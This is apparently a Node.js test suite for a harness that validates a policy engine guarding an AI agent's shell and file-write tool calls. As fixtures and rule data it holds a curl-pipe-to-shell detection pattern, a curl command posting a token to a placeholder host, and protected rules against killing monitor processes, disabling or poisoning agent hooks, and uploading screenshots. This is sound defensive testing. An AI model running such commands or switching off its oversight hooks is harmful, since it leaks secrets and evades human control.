import assert from "node:assert/strict";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { BLOCK_ASK_INVENTORY, assertAddendum } from "./spec-run.coverage.mjs";
import { buildCases } from "./spec-run.generate.mjs";
import {
  CATEGORIES,
  NOW,
  SEED,
  applyRuleMutation,
  assertExternalCorpus,
  assertRunReadOnly,
  digestDocument,
  exemptionAttemptMatches,
  loadRuntime,
  observe,
  repoRoot,
  runCorpus,
  stableStringify,
} from "./spec-run.mjs";

async function writeCase(root, id, files) {
  const dir = path.join(root, ...id.split("/"));
  await fs.mkdir(dir, { recursive: true });
  for (const [name, value] of Object.entries(files)) {
    const filename = name.endsWith(".json") ? name : `${name}.json`;
    await fs.writeFile(path.join(dir, filename), typeof value === "string" ? value : stableStringify(value));
  }
}

function engineCase(command, expected, extra = {}) {
  return {
    context: {
      customRules: [],
      fixtureKind: "engine",
      intervention: "enforcing",
      provenance: {
        acceptance: "NOT_ACCEPTED",
        baselineSha: "0ea8f6eac4457c5e13b22b7130f64d48e3613927",
        generator: "grok-wp02",
        note: extra.note ?? "self-test",
        origin: "synthetic",
        status: "PROPOSED",
        ...(extra.allowsEarlyReturn ? { allowsEarlyReturn: true } : {}),
      },
      seed: SEED,
    },
    expected,
    input: {
      agent: "claude",
      command,
      cwd: "/home/u/proj",
      nativeTool: "Bash",
      source: extra.source ?? "hook",
      ...(extra.proc ? { proc: extra.proc } : {}),
    },
    policy: { exemptions: [], now: NOW, overrides: { families: {}, rules: {} } },
  };
}

test("run mode and corpus location stay outside admission", () => {
  assert.throws(() => assertRunReadOnly(["run", "--write-expected"]), /read-only/);
  assert.throws(() => assertExternalCorpus(repoRoot()), /outside/);
  assert.throws(() => assertExternalCorpus(path.join(repoRoot(), "policy-spec")), /outside/);
});

test("rule mutation text changes only the targeted rule", () => {
  const source = [
    '  {',
    '    id: "curl_pipe_shell",',
    '    risk: "high",',
    '    action: "block",',
    '    pattern: "(curl|wget)[^|;\\\\n]*\\\\|\\\\s*(sh)\\\\b",',
    "  },",
    '  { id: "other", risk: "high", pattern: "(curl|wget)", },',
  ].join("\n");
  const disabled = applyRuleMutation(source, "curl_pipe_shell", "disable-pattern");
  assert.match(disabled, /id: "curl_pipe_shell"[\s\S]*pattern: "a\^"/);
  assert.match(disabled, /id: "other"/);
  const corrupted = applyRuleMutation(source, "curl_pipe_shell", "corrupt-risk");
  assert.match(corrupted, /id: "curl_pipe_shell"[\s\S]*risk: "info"/);
  assert.match(corrupted, /id: "other", risk: "high"/);
});

test("candidate builder keeps privacy counts and does not claim kill_monitor_process", async () => {
  const api = await loadRuntime();
  const built = buildCases(api);
  for (const kind of [
    "rest-id",
    "snowflake",
    "unix-time",
    "uuid",
    "git-sha",
    "ci-build",
    "semver-dateversion",
    "port",
    "ip",
    "digest",
    "order-number",
    "area-extension",
  ]) {
    const count = built.cases.filter((item) => item.id.startsWith(`privacy/${kind}/`)).length;
    assert.equal(count, 20, kind);
  }
  assert.equal(built.cases.filter((item) => item.id.startsWith("host-normalization/")).length, 19);
  assert.equal(built.cases.some((item) => item.id === "risky/disk-overwrite"), true);
  assert.equal(built.coverage.notExercised.some((row) => row.id === "kill_monitor_process"), true);
  assert.equal(built.cases.some((item) => item.id.startsWith("protected/") && item.id.includes("kill_monitor_process")), false);
  assert.equal(built.cases.some((item) => item.id === "boundaries/rule-negative/kill_monitor_process"), true);
  const aws = built.cases.find((item) => item.id === "risky/ic09/aws-no-issuer");
  assert.equal(aws.expected.compare.decision, "block");
  assert.ok(aws.expected.compare.secretKinds.includes("aws_key"));
  assert.equal(aws.input.command.includes("AKIAWP02SYNTHETIC1A"), false);
  const bearer = built.cases.find((item) => item.id === "risky/ic09/bearer-only");
  assert.deepEqual(bearer.expected.compare.secretKinds, ["bearer"]);
  const custom = built.cases.find((item) => item.id === "risky/ic09/custom-secret-only");
  assert.equal(custom.expected.compare.decision, "block");
  assert.ok(custom.expected.compare.secretKinds.includes("wp02_custom"));
  const openai = built.cases.find((item) => item.id === "risky/ic09/openai-header");
  assert.ok(openai.expected.v2Intended.kindOverlap.includes("bearer"));
  assert.equal(openai.expected.compare.decision, "block");
  assert.equal(built.coverage.exercised.filter((item) => item.exemptionStatus === "proven").length, 26);
  assert.equal(built.coverage.exercised.filter((item) => item.exemptionStatus === "unproven").length, 2);
  const known = built.cases.filter((item) => item.id.startsWith("privacy/") && item.expected.v2Intended?.classification?.startsWith("KNOWN_"));
  assert.ok(known.length > 0);
  assert.equal(known.every((item) => item.expected.compare.risk === "medium"), true);
  assert.equal(built.cases.some((item) => item.context.provenance.status === "SOURCE_INDEPENDENT"), true);
  assert.equal(
    built.cases.every((item) => item.context.provenance.acceptance !== "ACCEPT" && item.context.provenance.status !== "FROZEN"),
    true,
  );
});

test("runner rejects bad fixtures and accepts a read-only match", async () => {
  const api = await loadRuntime();
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "nmzp-wp02-spec-"));
  try {
    const bundle = engineCase("echo hello");
    const observed = observe(bundle, api);
    assert.equal(observed.ok, true);
    bundle.expected = { ...observed.observed, v2Intended: null };
    for (const category of CATEGORIES) {
      const sample = structuredClone(bundle);
      if (category === "host-normalization") {
        const host = {
          context: { ...bundle.context, fixtureKind: "host-normalization" },
          input: {
            agentFlag: "claude",
            raw: JSON.stringify({
              hook_event_name: "PreToolUse",
              tool_input: { command: "echo hello" },
              tool_name: "Bash",
            }),
          },
          policy: bundle.policy,
        };
        const seen = observe(host, api);
        assert.equal(seen.ok, true);
        assert.equal(seen.observed.normalization.command, "echo hello");
        host.expected = { ...seen.observed, v2Intended: null };
        await writeCase(root, `${category}/one`, host);
      } else {
        await writeCase(root, `${category}/one`, sample);
      }
    }
    await fs.writeFile(path.join(root, "PROPOSED_DIGEST.txt"), "status=PROPOSED\nhumanAccept=false\nfrozen=false\ncaseCount=0\nexpectedDigest=pending\n");
    const { expectedDigest } = await import("./spec-run.mjs");
    const digest = await expectedDigest(root);
    await fs.writeFile(path.join(root, "PROPOSED_DIGEST.txt"), digestDocument(digest));
    const ok = await runCorpus(root, api);
    assert.equal(ok.ok, true, JSON.stringify(ok.failures.map((failure) => [failure.id, failure.code, failure.detail.slice(0, 180)])));

    const mismatched = path.join(root, "normal", "one", "expected.json");
    const expected = JSON.parse(await fs.readFile(mismatched, "utf8"));
    expected.compare.decision = expected.compare.decision === "block" ? "log" : "block";
    await fs.writeFile(mismatched, stableStringify(expected));
    const bad = await runCorpus(root, api);
    assert.equal(bad.ok, false);
    assert.ok(bad.failures.some((failure) => failure.code === "result_mismatch"));
    expected.compare.decision = ok.cases.find((row) => row.id === "normal/one").compare.decision;
    await fs.writeFile(mismatched, stableStringify({ ...observed.observed, compare: ok.cases.find((row) => row.id === "normal/one").compare, v2Intended: null }));

    await writeCase(root, "normal/empty", {
      ...engineCase(""),
      expected: bundle.expected,
    });
    const empty = await runCorpus(root, api, { requireCategories: false });
    assert.ok(empty.failures.some((failure) => failure.id === "normal/empty" && failure.code === "empty_input"));
    await fs.rm(path.join(root, "normal", "empty"), { recursive: true, force: true });

    const weird = structuredClone(bundle);
    weird.context.fixtureKind = "shell";
    await writeCase(root, "normal/weird", { ...weird, expected: bundle.expected });
    const unsupported = await runCorpus(root, api, { requireCategories: false });
    assert.ok(unsupported.failures.some((failure) => failure.id === "normal/weird" && failure.code === "unsupported_kind"));
    await fs.rm(path.join(root, "normal", "weird"), { recursive: true, force: true });

    await writeCase(root, "host-normalization/broken", {
      context: { ...bundle.context, fixtureKind: "host-normalization" },
      expected: bundle.expected,
      input: { agentFlag: "claude", raw: "{not-json" },
      policy: bundle.policy,
    });
    const parsed = await runCorpus(root, api, { requireCategories: false });
    assert.ok(parsed.failures.some((failure) => failure.code === "parse_failure"));
    await fs.rm(path.join(root, "host-normalization", "broken"), { recursive: true, force: true });

    const injected = observe(
      {
        context: { ...bundle.context, fixtureKind: "host-normalization" },
        input: { agentFlag: "claude", raw: '{"tool_name":"Bash","tool_input":{}}' },
        policy: bundle.policy,
      },
      {
        ...api,
        detectHookAgent: () => "claude",
        parseHookEvent: () => ({ cwd: "/tmp", eventName: "PreToolUse", toolInput: {}, toolName: "Bash" }),
        toolInputToEvalFields: () => ({ command: "echo injected", nativeTool: "Bash" }),
      },
    );
    assert.equal(injected.ok, false);
    assert.equal(injected.code, "parser_field_divergence");

    const skippedRoot = await fs.mkdtemp(path.join(os.tmpdir(), "nmzp-wp02-skip-"));
    const unwatched = engineCase("echo hello", null, { allowsEarlyReturn: true, proc: "chrome", source: "probe" });
    const seen = observe(unwatched, api);
    unwatched.expected = { ...seen.observed, v2Intended: null };
    for (const category of CATEGORIES) {
      await writeCase(skippedRoot, `${category}/one`, category === "normal" ? unwatched : bundle);
    }
    const skipDigest = await expectedDigest(skippedRoot);
    await fs.writeFile(path.join(skippedRoot, "PROPOSED_DIGEST.txt"), digestDocument(skipDigest));
    const skipped = await runCorpus(skippedRoot, api);
    assert.ok(skipped.failures.some((failure) => failure.code === "category_all_skipped" && failure.id === "normal"));
    await fs.rm(skippedRoot, { recursive: true, force: true });

    const labeled = await fs.readFile(path.join(root, "PROPOSED_DIGEST.txt"), "utf8");
    await fs.writeFile(path.join(root, "PROPOSED_DIGEST.txt"), labeled.replace("humanAccept=false", "humanAccept=true"));
    const mislabeled = await runCorpus(root, api);
    assert.ok(mislabeled.failures.some((failure) => failure.code === "status_mislabel"));
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});

test("unknown fields, empty custom rules, origin, and v2Intended are rejected", async () => {
  const api = await loadRuntime();
  const base = engineCase("echo hello");
  const misspelled = structuredClone(base);
  misspelled.input.comand = "echo hello";
  assert.equal(observe(misspelled, api).code, "unknown_field");
  const emptyRule = structuredClone(base);
  emptyRule.context.customRules = [{}];
  assert.equal(observe(emptyRule, api).code, "invalid_custom_rule");
  const badOrigin = structuredClone(base);
  badOrigin.context.provenance.origin = "ACCEPT";
  assert.equal(observe(badOrigin, api).code, "invalid_shape");
  const seen = observe(base, api);
  const expected = { ...seen.observed };
  delete expected.v2Intended;
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "nmzp-wp02-shape-"));
  try {
    await writeCase(root, "normal/one", { ...base, expected });
    const result = await runCorpus(root, api, { requireCategories: false });
    assert.ok(result.failures.some((failure) => failure.code === "invalid_shape" && failure.detail.includes("v2Intended")));
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});

test("host escapes compare parsed commands and raw mutation is detected", async () => {
  const api = await loadRuntime();
  const cases = [
    ['{"cwd":"/tmp/p","hook_event_name":"PreToolUse","tool_input":{"command":"echo \\"hello\\""},"tool_name":"Bash"}', 'echo "hello"'],
    ['{"cwd":"/tmp/p","hook_event_name":"PreToolUse","tool_input":{"command":"echo C:\\\\temp\\\\a"},"tool_name":"Bash"}', "echo C:\\temp\\a"],
    ['{"cwd":"/tmp/p","hook_event_name":"PreToolUse","tool_input":{"command":"echo line1\\nline2"},"tool_name":"Bash"}', "echo line1\nline2"],
    ['{"cwd":"/tmp/p","hook_event_name":"PreToolUse","tool_input":{"command":"echo \\u4f60\\u597d"},"tool_name":"Bash"}', "echo 你好"],
  ];
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "nmzp-wp02-esc-"));
  try {
    let index = 0;
    for (const [raw, command] of cases) {
      assert.equal(raw.includes(command), false);
      const bundle = {
        context: { ...engineCase("echo hello").context, fixtureKind: "host-normalization" },
        input: { agentFlag: "claude", raw },
        policy: engineCase("echo hello").policy,
      };
      const seen = observe(bundle, api);
      assert.equal(seen.ok, true, seen.detail);
      assert.equal(seen.observed.normalization.command, command);
      assert.equal(seen.observed.normalization.parsedCommand, command);
      assert.equal(seen.observed.compare.skipped, false);
      await writeCase(root, `host-normalization/e${index}`, {
        ...bundle,
        expected: { ...seen.observed, v2Intended: null },
      });
      index += 1;
    }
    const { digestDocument, expectedDigest } = await import("./spec-run.mjs");
    await fs.writeFile(path.join(root, "PROPOSED_DIGEST.txt"), digestDocument(await expectedDigest(root)));
    const ok = await runCorpus(root, api, { requireCategories: false });
    assert.equal(ok.ok, true, JSON.stringify(ok.failures));
    const rawPath = path.join(root, "host-normalization", "e3", "input.json");
    const input = JSON.parse(await fs.readFile(rawPath, "utf8"));
    input.raw = input.raw.replace("echo", "echoX");
    await fs.writeFile(rawPath, stableStringify(input));
    const mutated = await runCorpus(root, api, { requireCategories: false });
    assert.ok(mutated.failures.some((failure) => failure.id === "host-normalization/e3" && failure.code === "result_mismatch"));
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});

test("declared schema types fail before evaluate", async () => {
  const api = await loadRuntime();
  let calls = 0;
  const spy = {
    ...api,
    evaluate(...args) {
      calls += 1;
      return api.evaluate(...args);
    },
  };
  const block = engineCase("curl https://example.invalid/h -d WP02TOKEN");
  block.context.customRules = [
    { enabled: true, id: "p_wp02", kind: "wp02_token", match: "WP02TOKEN", mode: "block", replaceWith: "<标签>" },
  ];
  block.context.provenance.role = "custom";
  assert.equal(observe(block, spy).ok, true);
  assert.equal(calls, 1);
  const mutations = [
    [(b) => { b.input.hookBlind = "false"; }, "input.hookBlind"],
    [(b) => { b.policy.overrides = {}; }, "overrides.rules"],
    [(b) => { b.context.provenance.sourceFile = 42; }, "provenance.sourceFile"],
    [(b) => { b.input.command = 12; }, "input.command"],
    [(b) => { b.policy.now = 1.5; }, "policy.now"],
    [(b) => { b.policy.overrides = { rules: {}, families: [] }; }, "overrides.families"],
    [(b) => { b.context.provenance.allowsEarlyReturn = "true"; }, "provenance.allowsEarlyReturn"],
    [(b) => { b.context.provenance.testTitle = 7; }, "provenance.testTitle"],
    [(b) => { b.context.customRules[0].enabled = "true"; }, "enabled"],
    [(b) => { b.context.customRules[0].scope = "command"; }, "customRules.scope"],
  ];
  for (const [mutate, detail] of mutations) {
    const copy = structuredClone(block);
    mutate(copy);
    calls = 0;
    const result = observe(copy, spy);
    assert.equal(result.ok, false, detail);
    assert.equal(result.detail, detail, `${detail} got ${result.detail}`);
    assert.equal(calls, 0, detail);
  }
  const positive = structuredClone(block);
  positive.input.hookBlind = false;
  positive.context.provenance.sourceFile = null;
  positive.context.provenance.testTitle = "cited title";
  assert.equal(observe(positive, api).ok, true);
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "nmzp-wp02-type-"));
  try {
    const seen = observe(block, api);
    const badExpected = { ...seen.observed, redacted: 1, v2Intended: null };
    await writeCase(root, "normal/one", { ...block, expected: badExpected });
    calls = 0;
    const ran = await runCorpus(root, spy, { requireCategories: false });
    assert.ok(ran.failures.some((failure) => failure.detail === "expected.redacted"));
    assert.equal(calls, 0);
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});

test("nonmatching exemption cannot earn protected coverage", async () => {
  const api = await loadRuntime();
  const rule = api.RULES.find((item) => item.id === "agent_hook_disable");
  const input = {
    agent: "claude",
    contents: '{"hooks":{"enabled":false}}',
    cwd: "/home/u/proj",
    filePath: "/tmp/.zcode/cli/config.json",
    nativeTool: "Write",
    source: "hook",
  };
  assert.equal(exemptionAttemptMatches(rule, input, "\\\\.zcode/cli/config\\\\.json", api), false);
  assert.equal(exemptionAttemptMatches(rule, input, "\\.zcode/cli/config\\.json", api), true);
  const built = buildCases(api);
  const covered = built.coverage.exercised.find((item) => item.id === "agent_hook_disable");
  assert.equal(covered.exemptionMatched, true);
  assert.deepEqual(covered.attempts, ["disable", "downgrade", "exempt"]);
  const exempt = built.cases.find((item) => item.id === "protected/agent_hook_disable/exempt");
  assert.equal(exempt.expected.compare.decision, "block");
  assert.equal(exempt.expected.compare.ruleId, "agent_hook_disable");
  assert.equal(exemptionAttemptMatches(rule, exempt.input, exempt.policy.exemptions[0].match, api), true);
  assert.equal(built.coverage.exercised.find((item) => item.id === "screenshot_then_upload").exemptionStatus, "unproven");
  assert.equal(built.coverage.exercised.find((item) => item.id === "agent_hook_poison").exemptionStatus, "unproven");
  assert.equal(built.cases.find((item) => item.id === "protected/screenshot_then_upload/disable").input.command.includes(";"), true);
  assert.equal(built.cases.find((item) => item.id === "protected/agent_hook_poison/disable").input.command, undefined);
  assert.equal(built.coverage.exercised.filter((item) => item.exemptionStatus === "proven").every((item) => item.exemptionMatched === true), true);
  assert.equal(built.coverage.notExercised.some((item) => item.id === "kill_monitor_process"), true);
  assert.equal(built.cases.some((item) => item.id.includes("kill_monitor_process/")), false);
  assert.equal(built.cases.some((item) => item.id === "boundaries/rule-negative/kill_monitor_process"), true);
});

test("coverage assertion reports omitted block/ask pairs", () => {
  const cases = BLOCK_ASK_INVENTORY.filter((id) => id !== "disk_overwrite").map((id) => ({
    expected: { compare: { ruleId: "other" } },
    id: `boundaries/rule-negative/${id}`,
  }));
  cases.push({ expected: { compare: { ruleId: null } }, id: "normal/f1-cat-dd" });
  assert.throws(
    () => assertAddendum(cases, { appendix: [], exercised: [], notExercised: [{ id: "kill_monitor_process" }] }),
    /omitted IC-09/,
  );
});
